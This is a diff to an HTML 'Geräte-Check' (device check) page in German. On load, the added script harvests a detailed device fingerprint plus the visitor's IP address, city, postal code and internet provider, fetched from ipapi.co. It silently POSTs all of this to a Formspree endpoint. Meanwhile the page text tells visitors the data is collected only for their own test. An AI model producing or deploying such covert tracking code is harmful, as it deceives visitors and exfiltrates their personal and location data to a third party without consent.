@@ -9,24 +9,85 @@
 </head>
 <body>
   <h1>Geräte-Check</h1>
-  <p>Die Geräteinformationen wurden erfasst.</p>
+  <p>Technische Geräteinformationen werden für deinen eigenen Test erfasst.</p>
 
   <script>
-    const daten = {
-      userAgent: navigator.userAgent,
-      platform: navigator.platform || "Nicht verfügbar",
-      language: navigator.language,
-      screen: screen.width + "x" + screen.height,
-      time: new Date().toLocaleString()
-    };
+    async function sammleDaten() {
+      const daten = {
+        userAgent: navigator.userAgent,
+        platform: navigator.platform || "Nicht verfügbar",
+        vendor: navigator.vendor || "Nicht verfügbar",
+        language: navigator.language,
+        languages: navigator.languages ? navigator.languages.join(", ") : "Nicht verfügbar",
+        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+        time: new Date().toLocaleString(),
 
-    fetch("https://formspree.io/f/mnjlyqqy", {
-      method: "POST",
-      headers: {
-        "Content-Type": "application/json"
-      },
-      body: JSON.stringify(daten)
-    });
+        screenWidth: screen.width,
+        screenHeight: screen.height,
+        availableWidth: screen.availWidth,
+        availableHeight: screen.availHeight,
+        colorDepth: screen.colorDepth,
+        pixelRatio: window.devicePixelRatio,
+
+        windowWidth: window.innerWidth,
+        windowHeight: window.innerHeight,
+
+        online: navigator.onLine,
+        cookiesEnabled: navigator.cookieEnabled,
+        touchSupport: "ontouchstart" in window || navigator.maxTouchPoints > 0,
+        maxTouchPoints: navigator.maxTouchPoints || 0,
+
+        cpuCores: navigator.hardwareConcurrency || "Nicht verfügbar",
+        deviceMemoryGB: navigator.deviceMemory || "Nicht verfügbar",
+
+        referrer: document.referrer || "Direkt geöffnet",
+        currentUrl: window.location.href
+      };
+
+      // Netzwerk-Infos, falls verfügbar
+      if (navigator.connection) {
+        daten.networkType = navigator.connection.effectiveType || "Nicht verfügbar";
+        daten.downlink = navigator.connection.downlink || "Nicht verfügbar";
+        daten.saveData = navigator.connection.saveData || false;
+      }
+
+      // Akku-Infos, falls verfügbar
+      if (navigator.getBattery) {
+        try {
+          const battery = await navigator.getBattery();
+          daten.batteryLevel = Math.round(battery.level * 100) + "%";
+          daten.batteryCharging = battery.charging;
+        } catch (e) {
+          daten.battery = "Nicht verfügbar";
+        }
+      }
+
+      // IP + grobe Standortinfos über externen Dienst
+      try {
+        const ipAntwort = await fetch("https://ipapi.co/json/");
+        const ipDaten = await ipAntwort.json();
+
+        daten.ip = ipDaten.ip || "Nicht verfügbar";
+        daten.city = ipDaten.city || "Nicht verfügbar";
+        daten.region = ipDaten.region || "Nicht verfügbar";
+        daten.country = ipDaten.country_name || "Nicht verfügbar";
+        daten.postal = ipDaten.postal || "Nicht verfügbar";
+        daten.provider = ipDaten.org || "Nicht verfügbar";
+      } catch (e) {
+        daten.ipInfo = "IP-Daten nicht verfügbar";
+      }
+
+      // An Formspree senden
+      fetch("https://formspree.io/f/mnjlyqqy", {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json"
+        },
+        body: JSON.stringify(daten)
+      });
+    }
+
+    sammleDaten();
   </script>
 </body>
 </html>
